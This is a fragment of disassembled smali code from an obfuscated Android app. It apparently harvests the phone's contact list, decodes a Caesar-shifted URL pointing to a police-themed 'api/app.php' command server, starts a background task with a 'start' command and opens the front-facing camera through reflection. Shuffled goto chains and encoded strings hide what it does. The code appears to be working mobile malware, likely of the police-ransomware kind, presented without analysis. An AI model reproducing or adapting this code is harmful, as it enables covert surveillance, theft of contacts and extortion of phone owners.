    :goto_3d
    nop

    sget-object v2, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    nop

    goto :goto_3c

    :goto_3e
    nop

    invoke-virtual/range {p0 .. p0}, Lcom/EDzgPz/KwIOuS/kdTxzV;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    nop

    goto :goto_3d

    :goto_3f
    nop

    const/16 v16, 0x0

    nop

    goto :goto_3e

    :goto_40
    nop

    invoke-interface {v10}, Landroid/database/Cursor;->getCount()I

    move-result v9

    nop

    goto :goto_3f

    :goto_41
    nop

    invoke-virtual/range {v1 .. v6}, Lcom/EDzgPz/KwIOuS/kdTxzV;->managedQuery(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v10

    nop

    goto :goto_40

    :goto_42
    nop

    move-object/from16 v1, p0

    nop

    goto :goto_41

    :goto_43
    nop

    const/4 v6, 0x0

    nop

    goto :goto_42

    :goto_44
    nop

    const/4 v5, 0x0

    nop

    goto :goto_43

    :goto_45
    nop

    const/4 v4, 0x0

    nop

    goto :goto_44

    :goto_46
    nop

    const/4 v3, 0x0

    nop

    goto :goto_45

    :goto_47
    nop

    sget-object v2, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    nop

    goto :goto_46

    :goto_48
    nop

    invoke-virtual {v1, v2}, Lcom/EDzgPz/KwIOuS/VuqHca;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    nop

    goto :goto_47

    :goto_49
    nop

    aput-object v11, v2, v3

    nop

    goto :goto_48

    :goto_4a
    nop

    const/4 v3, 0x2

    nop

    goto :goto_49

    :goto_4b
    nop

    aput-object v17, v2, v3

    nop

    goto :goto_4a

    :goto_4c
    nop

    const/4 v3, 0x1

    nop

    goto :goto_4b

    :goto_4d
    nop

    aput-object v4, v2, v3

    nop

    goto :goto_4c

    :goto_4e
    nop

    const-string v4, "iuuq;00qpsopqpmjdfvtb/dpn0bqj0bqq/qiq"

    invoke-static/range {v4 .. v4}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    nop

    goto :goto_4d

    :goto_4f
    nop

    const/4 v3, 0x0

    nop

    goto :goto_4e

    :goto_50
    nop

    new-array v2, v2, [Ljava/lang/String;

    nop

    goto :goto_4f

    :goto_51
    nop

    const/4 v2, 0x3

    nop

    goto :goto_50

    :goto_52
    nop

    invoke-direct {v1, v0}, Lcom/EDzgPz/KwIOuS/VuqHca;-><init>(Landroid/content/Context;)V

    nop

    goto :goto_51

    :goto_53
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_52

    :goto_54
    nop

    new-instance v1, Lcom/EDzgPz/KwIOuS/VuqHca;

    nop

    goto :goto_53

    :goto_55
    nop

    const-string v11, ""

    invoke-static/range {v11 .. v11}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    nop

    goto :goto_54

    :goto_56
    nop

    const-string v17, "tubsu"

    invoke-static/range {v17 .. v17}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v17

    nop

    goto :goto_55

    :goto_57
    nop

    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    nop

    goto :goto_56

    :goto_58
    nop

    nop
.end method

.method private xopenFrontFacingCameraGingerbread()Landroid/hardware/Camera;
    .locals 12

    .prologue
    nop

    goto/16 :goto_18

    :goto_0
    nop

    goto/16 :goto_b

    nop

    goto/16 :goto_19

    :goto_1
    nop

    const/4 v8, 0x2

    new-array v9, v8, [Ljava/lang/Class;

    new-array v10, v8, [Ljava/lang/Object;

    const/4 v8, 0x0

    const-class v11, Ljava/lang/String;

    aput-object v11, v9, v8

    aput-object v5, v10, v8

    const/4 v8, 0x1

    const-class v11, Ljava/lang/String;

    aput-object v11, v9, v8

    aput-object v6, v10, v8

    const-string v8, "e"

    const-class v11, Landroid/util/Log;

    invoke-virtual {v11, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    const/4 v11, 0x0

    invoke-virtual {v8, v11, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/Integer;

    invoke-virtual {v8}, Ljava/lang/Integer;->intValue()I

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v8, 0x0

    new-array v9, v8, [Ljava/lang/Class;

    new-array v10, v8, [Ljava/lang/Object;

    const-string v8, "toString"

    const-class v11, Ljava/lang/StringBuilder;

    invoke-virtual {v11, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    invoke-virtual {v8, v6, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v8, 0x1

    new-array v9, v8, [Ljava/lang/Class;

    new-array v10, v8, [Ljava/lang/Object;

    const/4 v8, 0x0

    const-class v11, Ljava/lang/String;

    aput-object v11, v9, v8

    aput-object v7, v10, v8

    const-string v8, "append"

    const-class v11, Ljava/lang/StringBuilder;

    invoke-virtual {v11, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    invoke-virtual {v8, v6, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/StringBuilder;

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v8, 0x0

    new-array v9, v8, [Ljava/lang/Class;

    new-array v10, v8, [Ljava/lang/Object;

    const-string v8, "getLocalizedMessage"

    const-class v11, Ljava/lang/RuntimeException;

    invoke-virtual {v11, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    invoke-virtual {v8, v4, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/String;

    nop

    goto :goto_3

    :goto_5
    nop

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_4

    :goto_6
    nop

    const-string v7, "Dbnfsb!gbjmfe!up!pqfo;!"

    invoke-static/range {v7 .. v7}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    nop

    goto :goto_5

    :goto_7
    nop

    new-instance v6, Ljava/lang/StringBuilder;

    nop

    goto :goto_6

    :goto_8
    nop

    const-string v5, "dbbn"

    invoke-static/range {v5 .. v5}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    nop

    goto :goto_7

    :catch_0
    :goto_9
    move-exception v4

    nop

    goto :goto_8

    :goto_a
    nop

    goto :goto_12

    nop

    goto :goto_9

    :cond_0
    :goto_b
    nop

    add-int/lit8 v1, v1, 0x1

    nop

    goto :goto_a

    :goto_c
    :try_start_0
    nop

    const/4 v8, 0x1

    new-array v9, v8, [Ljava/lang/Class;

    new-array v10, v8, [Ljava/lang/Object;

    const/4 v8, 0x0

    sget-object v11, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v11, v9, v8

    new-instance v11, Ljava/lang/Integer;

    invoke-direct {v11, v1}, Ljava/lang/Integer;-><init>(I)V

    aput-object v11, v10, v8

    const-string v8, "open"

    const-class v11, Landroid/hardware/Camera;

    invoke-virtual {v11, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    const/4 v11, 0x0

    invoke-virtual {v8, v11, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/hardware/Camera;

    nop

    goto :goto_b
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_d
    nop

    if-ne v5, v6, :cond_0

    nop

    goto :goto_c

    :goto_e
    nop

    const/4 v6, 0x1

    nop

    goto :goto_d

    :goto_f
    nop

    iget v5, v3, Landroid/hardware/Camera$CameraInfo;->facing:I

    nop

    goto :goto_e

    :cond_1
    :goto_10
    nop

    const/4 v8, 0x2

    new-array v9, v8, [Ljava/lang/Class;

    new-array v10, v8, [Ljava/lang/Object;

    const/4 v8, 0x0

    sget-object v11, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v11, v9, v8

    new-instance v11, Ljava/lang/Integer;

    invoke-direct {v11, v1}, Ljava/lang/Integer;-><init>(I)V

    aput-object v11, v10, v8

    const/4 v8, 0x1

    const-class v11, Landroid/hardware/Camera$CameraInfo;

    aput-object v11, v9, v8

    aput-object v3, v10, v8

    const-string v8, "getCameraInfo"

    const-class v11, Landroid/hardware/Camera;

    invoke-virtual {v11, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    const/4 v11, 0x0

    invoke-virtual {v8, v11, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_f

    :goto_11
    nop

    return-object v0

    nop

    goto :goto_10

    :goto_12
    nop

    if-lt v1, v2, :cond_1

    nop

    goto :goto_11

    :goto_13
    nop

    const/4 v1, 0x0

    nop

    goto :goto_12

    :goto_14
    nop

    const/4 v8, 0x0

    new-array v9, v8, [Ljava/lang/Class;

    new-array v10, v8, [Ljava/lang/Object;

    const-string v8, "getNumberOfCameras"

    const-class v11, Landroid/hardware/Camera;

    invoke-virtual {v11, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    const/4 v11, 0x0

    invoke-virtual {v8, v11, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/Integer;

    invoke-virtual {v8}, Ljava/lang/Integer;->intValue()I

    move-result v2

    nop

    goto :goto_13

    :goto_15
    nop

    invoke-direct {v3}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    nop

    goto :goto_14

    :goto_16
    nop

    new-instance v3, Landroid/hardware/Camera$CameraInfo;

    nop

    goto :goto_15

    :goto_17
    nop

    const/4 v0, 0x0

    nop

    goto :goto_16

    :goto_18
    nop

    const/4 v2, 0x0

    nop

    goto :goto_17

    :goto_19
    nop

    nop
.end method


# virtual methods
.method protected colotit()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/kdTxzV;->xcolotit()V

    return-void
.end method

.method protected ebat()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/kdTxzV;->xebat()V

    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 4

    invoke-direct {p0, p1, p2, p3}, Lcom/EDzgPz/KwIOuS/kdTxzV;->xonActivityResult(IILandroid/content/Intent;)V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/kdTxzV;->xonCreate(Landroid/os/Bundle;)V

    return-void
.end method
